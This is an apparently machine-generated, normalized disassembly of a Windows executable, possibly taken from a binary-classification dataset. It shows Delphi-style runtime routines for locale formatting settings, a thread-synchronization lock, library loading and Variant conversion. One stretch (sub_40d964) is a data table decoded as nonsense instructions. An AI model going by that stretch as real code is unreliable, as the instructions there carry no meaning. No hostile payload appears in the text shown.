sub_40ce04
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40d0cf
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40cc90
call sub_40b680
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b5d0
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_40416c
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b5d0
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_408684
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b5d0
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_408684
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b61c
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b61c
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b5d0
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_408684
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b61c
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b5d0
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b908
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_40416c
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b5d0
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b908
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_40416c
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b61c
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b5d0
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_40416c
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b5d0
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_40416c
lea eax [ ebp - 0x8 ]
call sub_404118
lea eax [ ebp - 0xc ]
call sub_404118
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b5d0
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_408684
test eax eax
jne r-xdata
call sub_40b858
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b0
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404498
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404498
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b61c
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d0d6
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_40413c
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40b5d0
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_408684
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b5d0
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_408684
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4041b0
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4041b0
jmp r-xdata
sub_40d17c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40d29f
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4041b0
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4041b0
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4081a4
lea edx [ ebp - 0xc ]
mov eax edi
call sub_4081a4
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_4041b0
mov eax esi
call sub_404118
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40ca64
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d2a6
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_40413c
retn
push [ esi ]
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404638
push [ ebp - 0x14 ]
push [ ebp - 0x4 ]
mov eax esi
mov edx 0x3
call sub_404498
lea eax [ ebp - 0x10 ]
push eax
mov eax edi
call sub_4043d8
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x10 ]
call sub_404638
test [ ebp + 0xc ] 0x1
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_4043e0
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4043d8
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x8 ]
call sub_404638
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_4043e0
jmp r-xdata
sub_40d2b8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40d348
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b584
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d34f
lea eax [ ebp - 0x14 ]
call sub_404118
retn
sub_40d3a0
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408b30
mov [ rw-data ] eax
sub_40d424
push ebx
push esi
push edi
push ebp
call sub_4036d0
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_40270c
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_40330c
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4036b8
sub_40d48c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40d474
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d514
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407fe0
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40d414
mov [ ebp ] eax
sub_40d514
push ebx
mov ebx eax
mov eax ebx
call sub_40d474
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40d414
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40d554
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032ec
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_40d5c8
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_40d654
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_40331c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_40d654
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d610
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40d48c
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40d41c
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40d3fc
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40d41c
test eax eax
je r-xdata
mov eax edi
call sub_40d610
test bl bl
je r-xdata
mov eax edi
call sub_40d644
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40d3fc
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40d408
sub_40d6f0
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d48c
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40d41c
mov eax ebx
call sub_40d628
mov eax ebx
call sub_40d61c
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d504
sub_40d740
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40d48c
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40d634
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40d408
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40d3fc
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40d634
mov eax esi
call sub_40d628
sub_40d7ac
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d48c
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d504
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40d3fc
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40d628
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40d628
sub_40d824
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d848
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d8bf
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_405ab8
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_4033d0
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d8c6
lea eax [ ebp - 0x4 ]
call sub_405ab8
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_4033d0
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d824
test al al
jne r-xdata
mov al 0x1
sub_40d8e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d952
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d934
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4045d8
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d93b
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d964
sbb eax 0x4000000
inc ebx
dec ecx
add [ eax - 0x3ffb6a1 ] bh
inc edx
dec ecx
add [ esi + ebx * 2 + 0x49 ] bl
add ah dh
inc edx
dec ecx
add ah ch
pop ebx
dec ecx
add ah ch
inc edx
dec ecx
add [ eax ] ch
pushad
dec ecx
add ah ah
inc edx
dec ecx
add [ eax + 0x49 ] ch
add ah bl
inc edx
dec ecx
add [ eax ] ah
pop ebp
dec ecx
add ah dl
inc edx
dec ecx
add [ esi + ebx * 2 ] bh
dec ecx
add ah cl
inc edx
dec ecx
add [ eax - 0x3bffb6a5 ] dl
inc edx
dec ecx
add [ eax - 0x43ffb6a2 ] ch
inc edx
dec ecx
add [ eax ] bl
pop edi
dec ecx
add [ edx + eax * 2 + 0x5df80049 ] dh
dec ecx
add [ edx + eax * 2 + 0x5e040049 ] ch
dec ecx
add [ edx + eax * 2 + 0x61040049 ] ah
dec ecx
add [ edx + eax * 2 + 0x5e000049 ] bl
dec ecx
add [ edx + eax * 2 + 0x61b80049 ] dl
dec ecx
add [ edx + eax * 2 + 0x5f740049 ] cl
dec ecx
add [ edx + eax * 2 + 0x5f480049 ] al
dec ecx
add [ edx + eax * 2 + 0x49 ] bh
add ah cl
popad
dec ecx
add [ edx + eax * 2 + 0x49 ] dh
add [ ecx + 0x49 ] bl
add [ edx + eax * 2 + 0x49 ] ch
add [ esi + ebx * 2 ] dl
dec ecx
add [ edx + eax * 2 + 0x49 ] ah
add [ ecx ] cl
dec ecx
add [ edx + eax * 2 + 0x49 ] bl
add [ eax ] ch
popad
dec ecx
add [ edx + eax * 2 + 0x49 ] dl
add [ eax ] al
pop ebp
dec ecx
add [ edx + eax * 2 + 0x49 ] cl
add [ esp + ebx * 2 + 0x42440049 ] cl
dec ecx
add [ edi + ebx * 2 ] bh
dec ecx
add [ edx + eax * 2 ] bh
dec ecx
add [ eax ] bl
dec ecx
add [ edx + eax * 2 ] dh
dec ecx
add [ ebx + ebx * 2 + 0x422c0049 ] bl
dec ecx
add [ eax ] al
popad
dec ecx
add [ edx + eax * 2 ] ah
dec ecx
add [ eax ] dl
pop esi
dec ecx
add [ eax ] ch
add [ eax ] al
add [ edx + eax * 2 ] bl
dec ecx
add al ah
pushad
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] bl
inc edx
dec ecx
add al bh
pop ebx
dec ecx
add [ eax ] al
add [ eax ] al
add [ edx + eax * 2 ] dl
dec ecx
add [ eax ] cl
pushad
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc edx
dec ecx
add [ eax + 0x495b ] ch
add [ eax ] al
add [ edx + eax * 2 ] cl
dec ecx
add ah al
pop esp
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc edx
dec ecx
add [ esp + ebx * 2 + 0x49 ] dh
add [ eax ] al
add al 0x42
dec ecx
add [ eax ] ch
pop esp
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
dec ecx
add [ esi + ebx * 2 ] cl
dec ecx
add [ eax ] al
add [ eax ] al
add ah bh
inc ecx
dec ecx
add [ eax + 0x5f ] dh
dec ecx
add [ eax ] al
add [ eax ] al
add al bh
inc ecx
dec ecx
add [ eax + 0x495c ] bh
add [ eax ] al
add ah dh
inc ecx
dec ecx
add [ eax ] dh
pop edi
dec ecx
add [ eax ] al
add [ eax ] al
add al dh
inc ecx
dec ecx
add [ eax + 0x60 ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add ah ch
inc ecx
dec ecx
add [ eax + 0x49 ] dl
add [ eax ] al
add [ eax ] al
add al ch
inc ecx
dec ecx
add [ edi + ebx * 2 + 0x49 ] bl
add [ eax ] al
in al 0x41
dec ecx
add ah dh
pop ebp
dec ecx
add [ eax ] al
add [ eax ] al
add al ah
inc ecx
dec ecx
add [ eax + 0x5d ] dh
dec ecx
add [ eax ] al
add [ eax ] al
add ah bl
inc ecx
dec ecx
add [ ebx + ebx * 2 + 0x49 ] ah
add [ eax ] al
fadd [ ecx + 0x49 ]
add [ eax + 0x60 ] dl
dec ecx
add [ eax ] al
add [ eax ] al
add ah dl
inc ecx
dec ecx
add ah ah
pop esi
dec ecx
add [ eax ] al
add [ eax ] al
add al dl
inc ecx
dec ecx
add [ eax + 0x5d ] bl
dec ecx
add [ eax ] al
add [ eax ] al
add ah cl
inc ecx
dec ecx
add [ esi + ebx * 2 + 0x49 ] ah
add [ eax ] al
enter 0x4941 0x0
push esp
pop edi
dec ecx
add [ eax ] al
add [ eax ] al
add ah al
inc ecx
dec ecx
add ah al
pop esi
dec ecx
add [ eax ] al
add [ eax ] al
add al al
inc ecx
dec ecx
add [ eax + 0x495d ] dh
add [ eax ] al
add [ ecx + eax * 2 + 0x5ba00049 ] bh
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x48004941 ] bh
pop esi
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 + 0x61340049 ] dh
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax - 0x43ffb6bf ] dh
pushad
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 + 0x5f2c0049 ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax - 0x3ffb6bf ] ch
pop esp
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 + 0x5bb40049 ] ah
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax - 0x57ffb6bf ] ah
pushad
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 + 0x61f80049 ] bl
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x34004941 ] bl
pop esp
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 + 0x5b8c0049 ] dl
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax - 0xbffb6bf ] dl
pushad
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 + 0x5f280049 ] cl
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax - 0x73ffb6bf ] cl
popad
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 + 0x49 ] ah
add [ esi + ebx * 2 ] ah
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x41 ] ah
dec ecx
add [ ebx * 2 + 0x49 ] cl
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40dda9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ddb0
retn
mov eax rw-data
call sub_40d814
call sub_40d380
call sub_40c4cc
mov eax rw-data
mov ecx 0x16
mov edx [ sub_40bfa4 ]
call sub_404bb4
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
call sub_404118
mov eax rw-data
mov edx [ r-xdata ]
call sub_405400
mov eax rw-data
mov edx [ r-xdata ]
call sub_405400
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
call sub_404118
mov eax rw-data
call sub_404118
mov eax rw-data
call sub_404118
mov eax rw-data
call sub_404118
mov eax rw-data
call sub_404118
mov eax rw-data
call sub_404118
mov eax rw-data
call sub_404118
mov eax rw-data
call sub_404118
mov eax rw-data
call sub_4047f8
mov eax rw-data
call sub_404118
sub_40ddb4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40de1c
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de23
retn
mov eax sub_40d964
call sub_403e40
mov eax r-xdata
call sub_403e68
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c448
call sub_40c54c
call sub_40d3a0
call sub_40ce04
mov eax rw-data
mov edx r-xdata
call sub_40416c
sub_40de54
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40dea8
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40df02
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4043a0
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40869c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40df09
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_40df14
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40df6e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4043a0
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409a54
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40df75
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_40df80
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dfda
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4043a0
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409a28
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dfe1
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_40dfec
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40e046
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4043a0
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b4f8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e04d
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_40e058
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40e0b2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4043a0
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409a80
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e0b9
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_40e0c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40e131
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4043a0
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_4087a8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e138
lea eax [ ebp - 0x8 ]
call sub_404118
retn
sub_40e144
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40e1a4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4099dc
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404944
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e1ab
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_40e1b4
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40e214
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40ac3c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404944
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e21b
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_40e224
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40e288
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_408844
mov edx [ ebp - 0x4 ]
